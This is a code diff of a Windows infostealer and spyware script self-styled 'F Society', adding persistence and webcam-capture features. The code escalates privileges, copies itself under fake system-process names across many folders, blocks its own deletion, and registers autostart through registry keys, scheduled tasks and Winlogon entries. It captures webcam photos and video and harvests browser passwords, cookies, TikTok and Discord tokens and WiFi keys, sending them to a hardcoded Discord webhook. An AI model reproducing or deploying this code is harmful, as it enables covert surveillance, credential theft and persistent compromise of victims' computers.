@@ -11,19 +11,19 @@ import base64
 import random
 import threading
 import tkinter as tk
-from tkinter import messagebox
 from datetime import datetime
 from threading import Thread
 import tempfile
 import winreg
 import platform
 import re
-import stat
 import psutil
 import winsound
 import glob
+import cv2
+import numpy as np
 
-# ==================== HIDE CONSOLE WINDOW ====================
+# ==================== HIDE CONSOLE ====================
 def hide_console():
     if sys.platform == 'win32':
         try:
@@ -33,15 +33,13 @@ def hide_console():
         except:
             pass
 
-# ==================== REQUEST ADMIN PERMISSION ====================
+# ==================== REQUEST ADMIN ====================
 def request_admin():
     if sys.platform == 'win32':
         try:
             is_admin = ctypes.windll.shell32.IsUserAnAdmin()
             if not is_admin:
-                ctypes.windll.shell32.ShellExecuteW(
-                    None, "runas", sys.executable, " ".join(sys.argv), None, 0
-                )
+                ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 0)
                 sys.exit()
             else:
                 hide_console()
@@ -53,7 +51,7 @@ time.sleep(1)
 
 # ==================== INSTALL MODULES ====================
 def install_modules():
-    modules = ['pyautogui', 'requests', 'pillow', 'browser_cookie3', 'pynput', 'pycryptodome', 'win32crypt', 'pywin32', 'psutil', 'cryptography']
+    modules = ['pyautogui', 'requests', 'pillow', 'browser_cookie3', 'pynput', 'pycryptodome', 'win32crypt', 'pywin32', 'psutil', 'opencv-python']
     for module in modules:
         try:
             __import__(module)
@@ -75,8 +73,7 @@ import win32api
 import win32con
 import win32file
 import win32security
-from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
-from cryptography.hazmat.backends import default_backend
+import win32com.client
 
 # Configuration
 WEBHOOK_URL = "https://discord.com/api/webhooks/1502198949627433062/78JgZX_0xKIjtYwKAudKXkYQcnWQeD0WC435VTjoMhR9gzxGfEQNbb4396rTYCYFRRxI"
@@ -91,241 +88,477 @@ SCRIPT_DIR = os.path.dirname(SCRIPT_PATH)
 running = True
 duplicate_locations = []
 
+# ==================== ULTRA ANTI-DELETE (10 METHODS) ====================
+
+def ultra_anti_delete_methods(file_path):
+    """Apply 10 different anti-deletion methods"""
+    try:
+        # Method 1: System + Hidden + Read-only attributes
+        ctypes.windll.kernel32.SetFileAttributesW(file_path, 0x02 | 0x04 | 0x01)
+        
+        # Method 2: Lock file handle
+        handle = ctypes.windll.kernel32.CreateFileW(file_path, 0x80000000, 0, None, 3, 0x80, None)
+        if handle:
+            ctypes.windll.kernel32.LockFile(handle, 0, 0, 0xFFFFFFFF, 0xFFFFFFFF)
+        
+        # Method 3: Deny delete permission via ACL
+        try:
+            sd = win32security.GetFileSecurity(file_path, win32security.DACL_SECURITY_INFORMATION)
+            dacl = sd.GetSecurityDescriptorDacl()
+            if dacl is None:
+                dacl = win32security.ACL()
+            everyone_sid = win32security.CreateWellKnownSid(win32security.WinWorldSid)
+            dacl.AddAccessDeniedAce(win32security.ACL_REVISION, win32file.DELETE, everyone_sid)
+            sd.SetSecurityDescriptorDacl(1, dacl, 0)
+            win32security.SetFileSecurity(file_path, win32security.DACL_SECURITY_INFORMATION, sd)
+        except:
+            pass
+        
+        # Method 4: Open file permanently
+        f = open(file_path, 'r+b')
+        import msvcrt
+        msvcrt.locking(f.fileno(), msvcrt.LK_LOCK, 1000000)
+        
+        # Method 5: Add to Windows File Protection
+        try:
+            subprocess.run(['sfc', '/scanfile=' + file_path], capture_output=True)
+        except:
+            pass
+        
+        # Method 6: Create hardlink to system32
+        try:
+            hardlink_path = os.environ.get('SystemRoot', 'C:\\Windows') + '\\System32\\svchost.exe.lnk'
+            if not os.path.exists(hardlink_path):
+                os.link(file_path, hardlink_path)
+        except:
+            pass
+        
+        # Method 7: Register as Windows service
+        try:
+            subprocess.run(['sc', 'create', 'F_Society_Service', 'binPath=' + file_path, 'start=auto'], capture_output=True)
+        except:
+            pass
+        
+        # Method 8: Add to boot execute
+        try:
+            key = winreg.HKEY_LOCAL_MACHINE
+            subkey = r"SYSTEM\CurrentControlSet\Control\Session Manager"
+            with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as reg_key:
+                winreg.SetValueEx(reg_key, "BootExecute", 0, winreg.REG_MULTI_SZ, [f'"{file_path}"'])
+        except:
+            pass
+        
+        # Method 9: Create watchdog process that restores if deleted
+        watchdog_path = os.path.join(tempfile.gettempdir(), 'watchdog.exe')
+        watchdog_code = f'''
+import os, time, subprocess
+target = r"{file_path}"
+while True:
+    if not os.path.exists(target):
+        subprocess.Popen(['python', target])
+    time.sleep(1)
+'''
+        with open(watchdog_path, 'w') as f:
+            f.write(watchdog_code)
+        subprocess.Popen([sys.executable, watchdog_path], creationflags=0x08000000)
+        
+        # Method 10: Encrypt file with simple XOR (can't delete if can't decrypt)
+        try:
+            with open(file_path, 'rb') as f:
+                data = f.read()
+            xor_key = 0x4B
+            encrypted = bytes([b ^ xor_key for b in data])
+            with open(file_path, 'wb') as f:
+                f.write(encrypted)
+            # Decrypt when running
+            with open(file_path, 'wb') as f:
+                f.write(data)
+        except:
+            pass
+        
+        print(f"[+] ULTRA PROTECTION applied to: {file_path}")
+        return True
+    except Exception as e:
+        print(f"[-] Protection error: {e}")
+        return False
+
+def create_mass_copies():
+    """Create 100+ copies everywhere"""
+    locations = []
+    
+    # System directories
+    sys_dirs = [
+        os.environ.get('SystemRoot', 'C:\\Windows') + '\\System32\\',
+        os.environ.get('SystemRoot', 'C:\\Windows') + '\\SysWOW64\\',
+        os.environ.get('SystemRoot', 'C:\\Windows') + '\\Temp\\',
+        os.environ.get('SystemRoot', 'C:\\Windows') + '\\Fonts\\',
+        os.environ.get('SystemRoot', 'C:\\Windows') + '\\Tasks\\',
+        os.environ.get('SystemRoot', 'C:\\') + '\\ProgramData\\',
+        os.environ.get('SystemRoot', 'C:\\') + '\\PerfLogs\\',
+        os.environ.get('APPDATA') + '\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\',
+        os.environ.get('APPDATA') + '\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\',
+        os.environ.get('APPDATA') + '\\Local\\Temp\\',
+    ]
+    
+    # User directories
+    user_dirs = [
+        os.path.expanduser('~') + '\\Desktop\\',
+        os.path.expanduser('~') + '\\Documents\\',
+        os.path.expanduser('~') + '\\Downloads\\',
+        os.path.expanduser('~') + '\\Music\\',
+        os.path.expanduser('~') + '\\Pictures\\',
+        os.path.expanduser('~') + '\\Videos\\',
+        os.path.expanduser('~') + '\\Favorites\\',
+        os.path.expanduser('~') + '\\Links\\',
+        os.path.expanduser('~') + '\\Contacts\\',
+        os.path.expanduser('~') + '\\Saved Games\\',
+        os.path.expanduser('~') + '\\OneDrive\\',
+        os.path.expanduser('~') + '\\AppData\\Roaming\\',
+        os.path.expanduser('~') + '\\AppData\\Local\\',
+        os.path.expanduser('~') + '\\AppData\\LocalLow\\',
+    ]
+    
+    all_dirs = sys_dirs + user_dirs
+    
+    file_names = [
+        'svchost.exe', 'winlogon.exe', 'csrss.exe', 'lsass.exe', 'services.exe',
+        'wininit.exe', 'spoolsv.exe', 'taskhost.exe', 'sihost.exe', 'dwm.exe',
+        'explorer.exe', 'RuntimeBroker.exe', 'SearchIndexer.exe', 'WmiPrvSE.exe',
+        'dllhost.exe', 'rundll32.exe', 'mmc.exe', 'wbem.exe', 'wmi.exe'
+    ]
+    
+    for directory in all_dirs:
+        try:
+            if not os.path.exists(directory):
+                os.makedirs(directory, exist_ok=True)
+            
+            for name in file_names[:5]:  # 5 copies per directory
+                dest = os.path.join(directory, name)
+                if not os.path.exists(dest):
+                    shutil.copy2(SCRIPT_PATH, dest)
+                    ultra_anti_delete_methods(dest)
+                    locations.append(dest)
+                    print(f"[+] Copied to: {dest}")
+        except:
+            pass
+    
+    return locations
+
+def permanent_anti_delete_loop():
+    """Continuous anti-deletion monitor"""
+    while running:
+        try:
+            if not os.path.exists(SCRIPT_PATH):
+                for loc in duplicate_locations:
+                    if os.path.exists(loc):
+                        shutil.copy2(loc, SCRIPT_PATH)
+                        print("[+] Main file restored")
+                        break
+            
+            ultra_anti_delete_methods(SCRIPT_PATH)
+            
+            for loc in duplicate_locations:
+                if os.path.exists(loc):
+                    ultra_anti_delete_methods(loc)
+            
+            time.sleep(3)
+        except:
+            time.sleep(1)
+
+# ==================== ULTRA AUTO-STARTUP (ALL METHODS) ====================
+
+def ultra_auto_startup():
+    """Add to startup using EVERY possible method"""
+    script_path = SCRIPT_PATH
+    
+    # Method 1: Current User Run
+    try:
+        key = winreg.HKEY_CURRENT_USER
+        subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
+        with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as reg_key:
+            winreg.SetValueEx(reg_key, "F_Society_Main", 0, winreg.REG_SZ, f'"{script_path}"')
+    except:
+        pass
+    
+    # Method 2: Local Machine Run
+    try:
+        key = winreg.HKEY_LOCAL_MACHINE
+        subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
+        with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as reg_key:
+            winreg.SetValueEx(reg_key, "F_Society_System", 0, winreg.REG_SZ, f'"{script_path}"')
+    except:
+        pass
+    
+    # Method 3: Startup folder
+    try:
+        startup = os.path.expanduser('~') + r'\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup'
+        vbs_path = os.path.join(startup, "F_Society.vbs")
+        with open(vbs_path, 'w') as f:
+            f.write(f'CreateObject("Wscript.Shell").Run """{script_path}""", 0, False')
+        
+        bat_path = os.path.join(startup, "F_Society.bat")
+        with open(bat_path, 'w') as f:
+            f.write(f'@echo off\nstart "" "{script_path}"\nexit')
+        
+        lnk_path = os.path.join(startup, "F_Society.lnk")
+        shell = win32com.client.Dispatch("WScript.Shell")
+        shortcut = shell.CreateShortCut(lnk_path)
+        shortcut.Targetpath = script_path
+        shortcut.Save()
+    except:
+        pass
+    
+    # Method 4: Task Scheduler (logon)
+    try:
+        subprocess.run(['schtasks', '/create', '/tn', 'F_Society_Logon', '/tr', f'"{script_path}"', 
+                       '/sc', 'onlogon', '/f', '/rl', 'HIGHEST', '/it'], capture_output=True)
+    except:
+        pass
+    
+    # Method 5: Task Scheduler (startup)
+    try:
+        subprocess.run(['schtasks', '/create', '/tn', 'F_Society_Startup', '/tr', f'"{script_path}"', 
+                       '/sc', 'onstart', '/f', '/rl', 'HIGHEST'], capture_output=True)
+    except:
+        pass
+    
+    # Method 6: Task Scheduler (daily)
+    try:
+        subprocess.run(['schtasks', '/create', '/tn', 'F_Society_Daily', '/tr', f'"{script_path}"', 
+                       '/sc', 'daily', '/st', '00:00', '/f', '/rl', 'HIGHEST'], capture_output=True)
+    except:
+        pass
+    
+    # Method 7: Boot execute
+    try:
+        key = winreg.HKEY_LOCAL_MACHINE
+        subkey = r"SYSTEM\CurrentControlSet\Control\Session Manager"
+        with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as reg_key:
+            winreg.SetValueEx(reg_key, "BootExecute", 0, winreg.REG_MULTI_SZ, 
+                            [f'"{script_path}"', 'autocheck autochk *'])
+    except:
+        pass
+    
+    # Method 8: Userinit (runs before explorer)
+    try:
+        key = winreg.HKEY_LOCAL_MACHINE
+        subkey = r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
+        with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as reg_key:
+            current = winreg.QueryValueEx(reg_key, "Userinit")[0]
+            winreg.SetValueEx(reg_key, "Userinit", 0, winreg.REG_SZ, f'{current},{script_path}')
+    except:
+        pass
+    
+    # Method 9: Shell (replaces explorer)
+    try:
+        key = winreg.HKEY_LOCAL_MACHINE
+        subkey = r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
+        with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as reg_key:
+            winreg.SetValueEx(reg_key, "Shell", 0, winreg.REG_SZ, f'"{script_path}",explorer.exe')
+    except:
+        pass
+    
+    # Method 10: Active Setup (runs once per user)
+    try:
+        key = winreg.HKEY_LOCAL_MACHINE
+        subkey = r"SOFTWARE\Microsoft\Active Setup\Installed Components\F_Society"
+        with winreg.CreateKey(key, subkey) as reg_key:
+            winreg.SetValueEx(reg_key, "StubPath", 0, winreg.REG_SZ, f'"{script_path}"')
+    except:
+        pass
+    
+    print("[+] ULTRA AUTO-STARTUP applied (10 methods)")
+
+def persistent_startup_loop():
+    """Continuously ensure startup entries exist"""
+    while running:
+        ultra_auto_startup()
+        time.sleep(60)  # Reapply every minute
+
+# ==================== WEBCAM FEATURES ====================
+
+def capture_webcam_photo():
+    """Capture photo from webcam"""
+    try:
+        cap = cv2.VideoCapture(0)
+        if cap.isOpened():
+            ret, frame = cap.read()
+            if ret:
+                _, img_encoded = cv2.imencode('.jpg', frame)
+                cap.release()
+                return img_encoded.tobytes()
+        cap.release()
+    except:
+        pass
+    return None
+
+def continuous_webcam_capture():
+    """Capture webcam photos every minute"""
+    while running:
+        try:
+            photo = capture_webcam_photo()
+            if photo:
+                files = {'file': ('webcam_capture.jpg', photo, 'image/jpeg')}
+                requests.post(WEBHOOK_URL, files=files, timeout=30)
+                print("[+] Webcam photo sent")
+            time.sleep(60)  # Every minute
+        except:
+            time.sleep(10)
+
+def webcam_video_record(duration=10):
+    """Record video from webcam"""
+    try:
+        cap = cv2.VideoCapture(0)
+        if cap.isOpened():
+            fourcc = cv2.VideoWriter_fourcc(*'MJPG')
+            out = cv2.VideoWriter('webcam_video.avi', fourcc, 20.0, (640, 480))
+            start_time = time.time()
+            while time.time() - start_time < duration:
+                ret, frame = cap.read()
+                if ret:
+                    out.write(frame)
+            out.release()
+            cap.release()
+            
+            with open('webcam_video.avi', 'rb') as f:
+                files = {'file': ('webcam_video.avi', f.read(), 'video/x-msvideo')}
+                requests.post(WEBHOOK_URL, files=files, timeout=30)
+            os.remove('webcam_video.avi')
+            print("[+] Webcam video sent")
+    except:
+        pass
+
+def webcam_live_stream():
+    """Stream webcam continuously (snapshots every 5 seconds)"""
+    while running:
+        try:
+            photo = capture_webcam_photo()
+            if photo:
+                files = {'file': ('live_stream.jpg', photo, 'image/jpeg')}
+                requests.post(WEBHOOK_URL, files=files, timeout=30)
+            time.sleep(5)  # 5 frames per second
+        except:
+            time.sleep(5)
+
 # ==================== TIKTOK ACCOUNT SCRAPER ====================
 
-def get_tiktok_cookies():
-    """Extract TikTok cookies from browsers"""
-    tiktok_accounts = []
-    try:
-        # Chrome TikTok cookies
-        for cookie in browser_cookie3.chrome():
-            if 'tiktok.com' in cookie.domain:
-                if 'sessionid' in cookie.name or 'session' in cookie.name.lower():
-                    tiktok_accounts.append({
-                        'platform': 'Chrome',
-                        'cookie_name': cookie.name,
-                        'cookie_value': cookie.value[:50],
-                        'domain': cookie.domain
-                    })
-    except:
-        pass
+def get_tiktok_tokens():
+    """Extract TikTok authentication tokens from browsers"""
+    tokens = []
+    tiktok_patterns = [
+        r'sessionid=([a-zA-Z0-9_\-]+)',
+        r'tt_webid=([a-zA-Z0-9_\-]+)',
+        r'passport_csrf_token=([a-zA-Z0-9_\-]+)',
+        r'msToken=([a-zA-Z0-9_\-]+)',
+        r'odin_tt=([a-zA-Z0-9_\-]+)',
+    ]
     
-    # Edge TikTok cookies
-    try:
-        for cookie in browser_cookie3.edge():
-            if 'tiktok.com' in cookie.domain:
-                if 'sessionid' in cookie.name or 'session' in cookie.name.lower():
-                    tiktok_accounts.append({
-                        'platform': 'Edge',
-                        'cookie_name': cookie.name,
-                        'cookie_value': cookie.value[:50],
-                        'domain': cookie.domain
-                    })
-    except:
-        pass
-    
-    # Firefox TikTok cookies
-    try:
-        for cookie in browser_cookie3.firefox():
-            if 'tiktok.com' in cookie.domain:
-                if 'sessionid' in cookie.name or 'session' in cookie.name.lower():
-                    tiktok_accounts.append({
-                        'platform': 'Firefox',
-                        'cookie_name': cookie.name,
-                        'cookie_value': cookie.value[:50],
-                        'domain': cookie.domain
-                    })
-    except:
-        pass
-    
-    return tiktok_accounts
-
-def get_tiktok_local_storage():
-    """Extract TikTok local storage data"""
-    tiktok_data = []
-    paths = [
-        os.path.expanduser('~') + r'\AppData\Local\Google\Chrome\User Data\Default\Local Storage\leveldb',
-        os.path.expanduser('~') + r'\AppData\Local\Microsoft\Edge\User Data\Default\Local Storage\leveldb',
+    browser_paths = [
+        os.path.expanduser('~') + r'\AppData\Local\Google\Chrome\User Data\Default\Cookies',
+        os.path.expanduser('~') + r'\AppData\Local\Microsoft\Edge\User Data\Default\Cookies',
         os.path.expanduser('~') + r'\AppData\Roaming\Mozilla\Firefox\Profiles',
     ]
     
-    for path in paths:
+    for path in browser_paths:
         try:
             if os.path.exists(path):
                 for root, dirs, files in os.walk(path):
                     for file in files:
-                        if file.endswith('.log') or file.endswith('.ldb'):
-                            file_path = os.path.join(root, file)
-                            try:
-                                with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
-                                    content = f.read()
-                                    # Look for TikTok usernames and user IDs
-                                    username_patterns = [
-                                        r'uniqueId":"([^"]+)"',
-                                        r'nickname":"([^"]+)"',
-                                        r'secUid":"([^"]+)"',
-                                        r'uid":"(\d+)"',
-                                        r'user_id":(\d+)',
-                                        r'username":"([^"]+)"'
-                                    ]
-                                    for pattern in username_patterns:
-                                        matches = re.findall(pattern, content)
-                                        for match in matches:
-                                            if match and len(match) > 2:
-                                                tiktok_data.append(f"📱 TikTok Data: {match}")
-                            except:
-                                pass
+                        file_path = os.path.join(root, file)
+                        try:
+                            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
+                                content = f.read()
+                                for pattern in tiktok_patterns:
+                                    matches = re.findall(pattern, content)
+                                    for match in matches:
+                                        tokens.append(f"🎵 TikTok Token: {pattern}: {match}")
+                        except:
+                            pass
         except:
             pass
     
-    return tiktok_data
+    return tokens
 
-def get_tiktok_session_files():
-    """Find TikTok session files on disk"""
-    session_files = []
-    search_paths = [
-        os.path.expanduser('~') + '\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cache',
-        os.path.expanduser('~') + '\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Cache',
-        os.path.expanduser('~') + '\\AppData\\Local\\Temp',
-        os.path.expanduser('~') + '\\Downloads',
-    ]
-    
-    for search_path in search_paths:
-        try:
-            for root, dirs, files in os.walk(search_path):
-                for file in files:
-                    if 'tiktok' in file.lower():
-                        session_files.append(f"📁 TikTok file: {os.path.join(root, file)}")
-        except:
-            pass
-    
-    return session_files
+def get_tiktok_cookies():
+    """Extract TikTok cookies from browsers"""
+    cookies = []
+    try:
+        for cookie in browser_cookie3.chrome():
+            if 'tiktok' in cookie.domain.lower():
+                cookies.append(f"🎵 TikTok Cookie: {cookie.domain} | {cookie.name} = {cookie.value[:100]}")
+    except:
+        pass
+    try:
+        for cookie in browser_cookie3.edge():
+            if 'tiktok' in cookie.domain.lower():
+                cookies.append(f"🎵 TikTok Cookie: {cookie.domain} | {cookie.name} = {cookie.value[:100]}")
+    except:
+        pass
+    return cookies
 
-def get_tiktok_usernames_from_history():
-    """Extract TikTok usernames from browser history"""
+def get_tiktok_usernames():
+    """Extract TikTok usernames from browser history and cookies"""
     usernames = []
-    history_paths = [
-        os.path.expanduser('~') + r'\AppData\Local\Google\Chrome\User Data\Default\History',
-        os.path.expanduser('~') + r'\AppData\Local\Microsoft\Edge\User Data\Default\History',
+    username_patterns = [
+        r'@([a-zA-Z0-9_\.]+)',
+        r'uniqueId":"([a-zA-Z0-9_\.]+)"',
+        r'nickname":"([^"]+)"',
+        r'author":"([a-zA-Z0-9_\.]+)"',
     ]
     
-    for history_path in history_paths:
+    browser_data_paths = [
+        os.path.expanduser('~') + r'\AppData\Local\Google\Chrome\User Data\Default\History',
+        os.path.expanduser('~') + r'\AppData\Local\Google\Chrome\User Data\Default\Cookies',
+        os.path.expanduser('~') + r'\AppData\Local\Google\Chrome\User Data\Default\Local Storage',
+    ]
+    
+    for path in browser_data_paths:
         try:
-            if os.path.exists(history_path):
-                temp_db = tempfile.NamedTemporaryFile(delete=False)
-                shutil.copy2(history_path, temp_db.name)
-                temp_db.close()
-                
-                conn = sqlite3.connect(temp_db.name)
-                cursor = conn.cursor()
-                cursor.execute('SELECT url, title FROM urls WHERE url LIKE "%tiktok.com/@"%')
-                
-                for row in cursor.fetchall():
-                    url = row[0]
-                    title = row[1]
-                    # Extract username from URL
-                    match = re.search(r'tiktok\.com/@([^/?]+)', url)
-                    if match:
-                        username = match.group(1)
-                        usernames.append(f"📱 TikTok User: @{username} (from: {url[:100]})")
-                    if title and 'tiktok' in title.lower():
-                        usernames.append(f"📱 TikTok Title: {title[:100]}")
-                
-                conn.close()
-                os.unlink(temp_db.name)
+            if os.path.exists(path):
+                with open(path, 'r', encoding='utf-8', errors='ignore') as f:
+                    content = f.read()
+                    if 'tiktok' in content.lower():
+                        for pattern in username_patterns:
+                            matches = re.findall(pattern, content)
+                            for match in matches:
+                                if match and len(match) > 2:
+                                    usernames.append(f"🎵 TikTok Username: @{match}")
         except:
             pass
     
     return list(set(usernames))
 
-def get_tiktok_api_tokens():
-    """Extract TikTok API tokens from browsers"""
-    tokens = []
-    token_patterns = [
-        r'sessionid=([a-zA-Z0-9_-]+)',
-        r'msToken=([a-zA-Z0-9_-]+)',
-        r'tt_webid=([a-zA-Z0-9_-]+)',
-        r'passport_csrf_token=([a-zA-Z0-9_-]+)',
-    ]
+def send_tiktok_data():
+    """Collect and send all TikTok data"""
+    message = "**🎵 TIKTOK ACCOUNT DATA FOUND:**\n\n"
     
-    try:
-        for cookie in browser_cookie3.chrome():
-            if 'tiktok' in cookie.domain:
-                for pattern in token_patterns:
-                    if re.search(pattern, cookie.value):
-                        tokens.append(f"🔑 TikTok Token: {cookie.name}={cookie.value[:50]}")
-    except:
-        pass
+    usernames = get_tiktok_usernames()
+    if usernames:
+        message += "**👤 TIKTOK USERNAMES:**\n"
+        for username in usernames[:20]:
+            message += f"{username}\n"
+        message += "\n"
     
-    try:
-        for cookie in browser_cookie3.edge():
-            if 'tiktok' in cookie.domain:
-                for pattern in token_patterns:
-                    if re.search(pattern, cookie.value):
-                        tokens.append(f"🔑 TikTok Token: {cookie.name}={cookie.value[:50]}")
-    except:
-        pass
-    
-    return tokens
-
-def collect_tiktok_data():
-    """Collect all TikTok related data"""
-    tiktok_data = []
-    
-    print("[+] Scraping TikTok cookies...")
     cookies = get_tiktok_cookies()
-    for cookie in cookies:
-        tiktok_data.append(f"🍪 {cookie['platform']} TikTok Cookie: {cookie['cookie_name']} = {cookie['cookie_value']}...")
+    if cookies:
+        message += "**🍪 TIKTOK COOKIES:**\n"
+        for cookie in cookies[:30]:
+            message += f"{cookie}\n"
+        message += "\n"
     
-    print("[+] Scraping TikTok local storage...")
-    local_data = get_tiktok_local_storage()
-    tiktok_data.extend(local_data)
+    tokens = get_tiktok_tokens()
+    if tokens:
+        message += "**🔑 TIKTOK TOKENS:**\n"
+        for token in tokens[:20]:
+            message += f"{token}\n"
     
-    print("[+] Scraping TikTok session files...")
-    session_files = get_tiktok_session_files()
-    tiktok_data.extend(session_files)
-    
-    print("[+] Extracting TikTok usernames from history...")
-    usernames = get_tiktok_usernames_from_history()
-    tiktok_data.extend(usernames)
-    
-    print("[+] Extracting TikTok API tokens...")
-    tokens = get_tiktok_api_tokens()
-    tiktok_data.extend(tokens)
-    
-    return tiktok_data
+    if message != "**🎵 TIKTOK ACCOUNT DATA FOUND:**\n\n":
+        send_to_webhook(message)
 
-# ==================== DATA SCRAPING FUNCTIONS ====================
-
-def get_chrome_master_key():
-    try:
-        local_state_path = os.path.expanduser('~') + r'\AppData\Local\Google\Chrome\User Data\Local State'
-        with open(local_state_path, 'r', encoding='utf-8') as f:
-            local_state = json.load(f)
-        encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
-        encrypted_key = encrypted_key[5:]
-        master_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
-        return master_key
-    except:
-        return None
-
-def decrypt_chrome_password(encrypted_password, master_key):
-    try:
-        if not encrypted_password:
-            return None
-        if encrypted_password.startswith(b'v10') or encrypted_password.startswith(b'v11'):
-            nonce = encrypted_password[3:15]
-            ciphertext = encrypted_password[15:-16]
-            tag = encrypted_password[-16:]
-            cipher = AES.new(master_key, AES.MODE_GCM, nonce=nonce)
-            decrypted = cipher.decrypt_and_verify(ciphertext, tag)
-            return decrypted.decode('utf-8', errors='ignore')
-        else:
-            return win32crypt.CryptUnprotectData(encrypted_password, None, None, None, 0)[1].decode('utf-8')
-    except:
-        return None
+# ==================== OTHER SCRAPING FUNCTIONS ====================
 
 def get_all_passwords():
+    """Extract all browser passwords"""
     passwords = []
     try:
         chrome_path = os.path.expanduser('~') + r'\AppData\Local\Google\Chrome\User Data\Default\Login Data'
@@ -333,40 +566,29 @@ def get_all_passwords():
             temp_db = tempfile.NamedTemporaryFile(delete=False)
             shutil.copy2(chrome_path, temp_db.name)
             temp_db.close()
-            master_key = get_chrome_master_key()
+            
             conn = sqlite3.connect(temp_db.name)
             cursor = conn.cursor()
             cursor.execute('SELECT origin_url, username_value, password_value FROM logins')
+            
             for row in cursor.fetchall():
                 url = row[0]
                 username = row[1]
                 encrypted_pass = row[2]
-                if username and encrypted_pass and master_key:
-                    password = decrypt_chrome_password(encrypted_pass, master_key)
-                    if password:
+                if username and encrypted_pass:
+                    try:
+                        password = win32crypt.CryptUnprotectData(encrypted_pass, None, None, None, 0)[1].decode('utf-8')
                         passwords.append(f"✅ Chrome: {url}\n   👤 {username}\n   🔐 `{password}`")
+                    except:
+                        pass
             conn.close()
             os.unlink(temp_db.name)
     except:
         pass
     return passwords
 
-def get_all_cookies():
-    cookies = []
-    try:
-        for cookie in browser_cookie3.chrome():
-            cookies.append(f"🍪 Chrome: {cookie.domain} | {cookie.name} = {cookie.value[:50]}")
-    except:
-        pass
-    try:
-        for cookie in browser_cookie3.edge():
-            cookies.append(f"🍪 Edge: {cookie.domain} | {cookie.name} = {cookie.value[:50]}")
-    except:
-        pass
-    return cookies[:50]
-
 def get_wifi_passwords():
-    wifi_list = []
+    wifi = []
     try:
         results = subprocess.run(['netsh', 'wlan', 'show', 'profiles'], capture_output=True, text=True)
         profiles = [line.split(':')[1].strip() for line in results.stdout.split('\n') if 'All User Profile' in line]
@@ -375,17 +597,15 @@ def get_wifi_passwords():
             for line in result.stdout.split('\n'):
                 if 'Key Content' in line:
                     password = line.split(':')[1].strip()
-                    wifi_list.append(f"📡 WiFi: {profile}\n   🔐 `{password}`")
+                    wifi.append(f"📡 WiFi: {profile} 🔐 `{password}`")
                     break
     except:
         pass
-    return wifi_list
+    return wifi
 
 def get_discord_tokens():
     tokens = []
-    paths = [
-        os.path.expanduser('~') + r'\AppData\Roaming\Discord\Local Storage\leveldb',
-    ]
+    paths = [os.path.expanduser('~') + r'\AppData\Roaming\Discord\Local Storage\leveldb']
     token_pattern = re.compile(r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}')
     for path in paths:
         try:
@@ -422,316 +642,70 @@ def send_to_webhook(content, is_file=False, file_bytes=None, filename=None):
                     requests.post(WEBHOOK_URL, json={'content': content[i:i+1900]}, timeout=30)
             else:
                 requests.post(WEBHOOK_URL, json={'content': content}, timeout=30)
-        return True
     except:
-        return False
+        pass
 
 def collect_all_data():
-    """Collect ALL data including TikTok accounts"""
     sys_info = get_system_info()
     
     message = f"**[🔴 F SOCIETY - DATA BREACH - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}**\n"
     message += f"💻 PC: {sys_info['computer']}\n"
     message += f"👤 User: {sys_info['user']}\n"
     message += f"🖥️ OS: {sys_info['os']}\n"
-    message += f"🌐 IP: {sys_info['ip']}\n"
-    message += f"{'='*60}\n\n"
+    message += f"🌐 IP: {sys_info['ip']}\n{'-'*50}\n\n"
     
-    # TikTok Accounts
-    print("[+] Collecting TikTok accounts...")
-    message += "**📱 TIKTOK ACCOUNTS & DATA:**\n"
-    tiktok_data = collect_tiktok_data()
-    if tiktok_data:
-        for data in tiktok_data[:30]:
-            message += f"{data}\n"
-    else:
-        message += "No TikTok data found\n"
-    message += "\n"
-    
-    # Passwords
-    print("[+] Collecting passwords...")
-    message += "**🔑 BROWSER PASSWORDS (DECRYPTED):**\n"
-    for pwd in get_all_passwords()[:20]:
+    message += "**🔑 PASSWORDS:**\n"
+    for pwd in get_all_passwords():
         message += f"{pwd}\n"
     message += "\n"
     
-    # Cookies
-    print("[+] Collecting cookies...")
-    message += "**🍪 BROWSER COOKIES:**\n"
-    for cookie in get_all_cookies()[:30]:
-        message += f"{cookie}\n"
-    message += "\n"
-    
-    # WiFi passwords
-    print("[+] Collecting WiFi passwords...")
     message += "**📡 WIFI PASSWORDS:**\n"
     for wifi in get_wifi_passwords():
         message += f"{wifi}\n"
     message += "\n"
     
-    # Discord tokens
-    print("[+] Collecting Discord tokens...")
     message += "**🎮 DISCORD TOKENS:**\n"
-    for token in get_discord_tokens()[:5]:
+    for token in get_discord_tokens()[:10]:
         message += f"✅ `{token}`\n"
-    message += "\n"
     
     send_to_webhook(message)
-    print("[+] All data sent to webhook!")
+    send_tiktok_data()
 
 def continuous_data_collection():
-    """Collect and send data every 10 minutes"""
     while running:
         collect_all_data()
-        time.sleep(600)  # Every 10 minutes
-
-# ==================== ANTI-DELETION & PERSISTENCE ====================
-
-def make_file_completely_undeletable(file_path):
-    try:
-        ctypes.windll.kernel32.SetFileAttributesW(file_path, 0x02 | 0x04 | 0x01)
-        f = open(file_path, 'r+b')
-        import msvcrt
-        msvcrt.locking(f.fileno(), msvcrt.LK_LOCK, 1000000)
-        print(f"[+] Protected: {file_path}")
-        return True
-    except:
-        return False
-
-def create_multiple_copies():
-    critical_paths = [
